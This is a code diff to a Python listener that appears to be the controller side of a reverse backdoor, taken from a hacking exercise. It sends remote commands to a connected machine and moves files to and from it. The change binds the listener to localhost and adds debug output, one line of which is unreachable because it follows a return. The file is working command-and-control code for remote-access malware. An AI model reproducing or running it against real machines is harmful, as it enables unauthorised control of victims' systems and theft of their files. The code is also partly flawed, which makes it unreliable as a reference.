@@ -5,20 +5,18 @@ import subprocess
 
 
 class Listener:
-    def __init__(self, ip, port):
+    def __init__(self, port):
         listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 
-        self.ip = ip
         self.port = port
         self.host_name = socket.gethostname()
 
-        listener.bind((self.ip, self.port))
+        listener.bind(("127.0.0.1", self.port))
         listener.listen(4)
 
         server_about = {
             "HostName": self.host_name,
-            "Ip": self.ip,
             "Port": self.port
         }
 
@@ -34,6 +32,7 @@ class Listener:
         json_data = json.dumps(data)
         json_data = json_data.encode("utf-8")
         self.connection.send(json_data)
+        print(f"[+] rel send -> {data}")
 
     def reliable_receive(self):
         json_data = ""
@@ -41,6 +40,7 @@ class Listener:
             try:
                 json_data = json_data + self.connection.recv(1024).decode("utf-8")
                 return json.loads(json_data)
+                print(f"[+] rcv -> {json.loads(json_data)}")
             except ValueError:
                 continue
 
@@ -71,14 +71,18 @@ class Listener:
                     if command[0] == "download":
                         print(f"[+] Downloading file as {command[1]}")
                         result = self.write_file(command[1], result)
+
                     if command[0] == "upload" and "[-] Error" not in result:
                         file_content = self.read_file(command[1])
                         command.append(file_content)
+
                 except Exception:
-                    result = "[-] Error during comand execution ::Srver::"
+                    result = "[-] Error during comand execution ::Server::"
+                    print(result)
 
                 result = self.execute_remotely(command)
-                print(result)
+                print(f"\n[result]\n{result}\n[#####]\n")
+
         except KeyboardInterrupt:
             print("\n[-] Quiting")
             self.connection.close()
@@ -102,8 +106,6 @@ if __name__ == "__main__":
             print(f"\t{i}")
         print("-"*42)
 
-
-    ip = socket.gethostbyname(socket.gethostname())
     port = 8080
-    listener = Listener(ip, port)
+    listener = Listener(port)
     listener.run()
